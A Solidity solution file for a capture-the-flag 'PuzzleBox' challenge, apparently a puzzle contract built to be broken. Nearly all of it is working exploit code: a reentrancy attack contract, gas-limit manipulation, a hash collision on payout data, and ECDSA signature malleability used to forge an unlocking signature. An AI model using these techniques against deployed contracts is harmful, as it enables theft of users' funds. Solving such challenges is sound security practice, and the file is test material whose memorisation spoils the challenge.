pragma solidity ^0.8.19;

import "./PuzzleBox.sol";

contract PuzzleBoxSolution {
    event LogBalance(uint256 balance);
    event LogDripCount(uint256 dripCount);
    event LogLastDripId(uint256 lastDripId);

    uint256 constant CURVEORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function solve(PuzzleBox puzzle) external {
        // How close can you get to opening the box?

        ReentranceAttack re = new ReentranceAttack(address(puzzle));
        re.callDrip();

        // call creep with enough gas so that creepForward files beyond 7 calls
        puzzle.creep{gas: 99000}();

        // warm up the stack to lower leak() gas consumption
        payable(address(uint160(address(puzzle)) + uint160(2))).transfer(1);
        puzzle.leak();
        puzzle.zip();

        // _emitAndRevert(puzzle);

        // burn other drip Ids
        uint256[] memory otherDripIds = new uint256[](6);
        otherDripIds[0] = 2;
        otherDripIds[1] = 4;
        otherDripIds[2] = 6;
        otherDripIds[3] = 7;
        otherDripIds[4] = 8;
        otherDripIds[5] = 9;

        // use encodepacked to reduce byte size for torch
        bytes memory packedCall = abi.encodePacked(
                puzzle.torch.selector,
                uint256(0x01),
                uint8(0),
                abi.encode(otherDripIds)
            );

        (bool s, ) = address(puzzle).call(
            packedCall
        );
        require(s, "torck failed");

        // use hash collision to change friends cut
        address payable[] memory friends = new address payable[](1);
        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
        uint256[] memory friendsCutBps = new uint256[](3);
        friendsCutBps[0] = uint256(uint160(0xC817dD2a5daA8f790677e399170c92AabD044b57)); // 100%
        friendsCutBps[1] = 0.015e4; // 1.5%
        friendsCutBps[2] = 0.0075e4; // 0.75%
        puzzle.spread(
            friends,
            friendsCutBps
        );

        puzzle.open(
            0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8,
            // signature malleability to create collision
            abi.encodePacked(
                uint256(0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8),
                CURVEORDER - uint256(0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df),
                uint8(0x1b)
            )
        );

    }

    function _emitAndRevert(PuzzleBox _puzzle) internal {
        emit LogBalance(address(_puzzle).balance);
        emit LogDripCount(_puzzle.dripCount());
        emit LogLastDripId(_puzzle.lastDripId());
        revert("emitAndRevert");
    }
}

contract ReentranceAttack {
    PuzzleBox immutable private puzzle;
    PuzzleBoxSolution immutable private _solution;

    constructor(address _puzzle) {
        puzzle = PuzzleBox(_puzzle);
        _solution = PuzzleBoxSolution(msg.sender);
        // call operate() to become operator and transfer all ethers
        puzzle.operate();
        // unlock torch selector
        PuzzleBoxProxy(payable(address(puzzle))).lock(puzzle.torch.selector, false);
    }

    function callDrip() public {
        // call drip with 100 + 1 wei
        puzzle.drip{value: 101}();
    }

    receive () external payable {
        // terminate when 1000 wei has been transferred to puzzle
        if (address(this).balance > 1337 - 1000) {
            callDrip();
        } else {
            selfdestruct(payable(address(_solution)));
        }
    }
}
